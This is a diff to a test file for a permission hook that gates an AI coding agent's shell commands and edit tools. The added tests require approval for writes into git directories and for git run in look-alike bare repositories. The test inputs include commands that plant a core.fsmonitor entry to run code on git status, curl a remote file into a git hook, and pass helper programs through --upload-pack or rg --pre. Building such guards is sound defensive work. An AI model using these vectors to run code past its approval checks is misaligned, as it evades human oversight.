@@ -227,6 +227,23 @@ test("find that only lists is allowed without a card; find that acts or follows 
   }
 });
 
+// Sixth review R6-1: a line written to .git/config (core.fsmonitor) ran on the next `git status`
+// without a card, and so would a folder that only looks like a bare repository.
+test("writes into a git directory and git in a look-alike bare repository ask while the switch is off", () => {
+  const bare = path.join(root, "bare");
+  mkdirSync(path.join(bare, "objects"), { recursive: true });
+  mkdirSync(path.join(bare, "refs"), { recursive: true });
+  writeFileSync(path.join(bare, "HEAD"), "ref: refs/heads/main\n");
+  for (const command of ["printf '[core]\\n\\tfsmonitor = touch M\\n' >> .git/config", "echo x > .git/hooks/pre-commit", "echo x > .GIT/config", "echo x > sub/.git/config", "cd src && echo x > ../.git/config".replace("../", ""),
+    "sort -o .git/config a.txt", "sort --output=.git/config a.txt", "curl -o .git/hooks/post-checkout https://e.com/x", "mkdir -p .git/hooks", "touch .git/hooks/x", "cd bare && git status", "git status && cd bare && git log"]) {
+    assert.notEqual(decide(command), "allow", command);
+    assert.equal(decide(command), "ask", command);
+  }
+  assert.equal(decide("git status", false, bare), "ask", "git started in the look-alike repository");
+  for (const command of ["cat .git/config", "ls .git", "git status", "echo x > notes/git.txt"]) assert.notEqual(decide(command), "ask", command);
+  assert.notEqual(decide("echo x > .git/config", true), "allow", "switch on: no pre-approval either");
+});
+
 // R6-2: tsconfig's outDir wrote JS outside the folder under the plain `tsc` rule. R6-3: paths inside
 // ffmpeg filter values and gh's download folder were not checked.
 test("tsc passes only with --noEmit; ffmpeg filter paths and gh download folders outside ask", () => {
@@ -288,4 +305,12 @@ test("the hook script asks for code runs unless the workspace pre-approves them,
   for (const command of ["sort --compress-program=./m1.sh a.txt -o out.txt", "git fetch --upload-pack=./m2.sh .", "git push --receive-pack=./m3.sh . HEAD:refs/heads/x", "rg --pre=./m4.sh hello .", "sort --compress-prog=./x a.txt", "rg -nz x"]) assert.equal(decision(run(command)), "ask", command);
   assert.equal(decision(run("find . -name '*.ts'")), "allow");
   assert.equal(decision(run("sort -rn a.txt")), "allow");
+  // R6-1: Claude's own edit tools writing into a git directory ask while the switch is off.
+  const edit = (tool: string, file: string, runtime = false) => spawnSync(process.execPath, [script, root, ...(runtime ? ["runtime"] : [])], { input: JSON.stringify({ tool_name: tool, tool_input: { file_path: file, content: "x" }, cwd: root }), encoding: "utf8" });
+  assert.equal(decision(edit("Edit", path.join(root, ".git", "config"))), "ask");
+  assert.equal(decision(edit("Write", ".git/hooks/pre-commit")), "ask");
+  assert.equal(decision(edit("Write", "link/../repo/.Git/config")), "ask");
+  assert.equal(decision(edit("Edit", "a.txt")), undefined);
+  assert.equal(decision(edit("Edit", path.join(root, ".git", "config"), true)), undefined, "switch on: Claude's rules decide");
+  assert.equal(JSON.parse(bashHookSettings(script, root)).hooks.PreToolUse[1].matcher, "Edit|Write|MultiEdit|NotebookEdit");
 });
